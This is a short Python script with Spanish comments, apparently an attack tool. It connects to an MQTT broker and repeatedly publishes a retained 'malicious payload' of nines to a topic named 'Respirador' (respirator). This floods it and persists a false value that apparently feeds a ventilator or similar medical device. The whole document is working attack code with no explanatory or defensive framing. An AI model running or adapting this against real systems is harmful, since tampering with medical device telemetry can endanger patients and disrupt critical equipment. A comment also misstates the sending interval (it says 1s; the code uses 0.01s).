
import paho.mqtt.client as mqtt
import time

BROKER = "10.0.2.15"  # Cambia según tu broker
PORT = 1883               # Puerto del broker
TOPIC = "Respirador"     # Topic objetivo
PAYLOAD = "9999999999999999999999999999999999999999999999999999999999999999999"     # Payload malicioso

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[+] Connected successfully")
    else:
        print(f"[!] Failed to connect, return code {rc}")

# Crear cliente MQTT
client = mqtt.Client(client_id="retained_attacker")
client.on_connect = on_connect

# Conectar al broker
client.connect(BROKER, PORT, 60)
client.loop_start()  # Mantiene la conexión en hilo

# Enviar mensaje con 'retain=True' en bucle para mantener persistente el valor falso
try:
    while True:
        client.publish(TOPIC, PAYLOAD, retain=True)
        print(f"[+] Retained message sent to {TOPIC}: {PAYLOAD}")
        time.sleep(0.01)  # Control de velocidad (1s entre envíos)
except KeyboardInterrupt:
    print("\n[!] Attack stopped by user")
    client.loop_stop()
    client.disconnect()
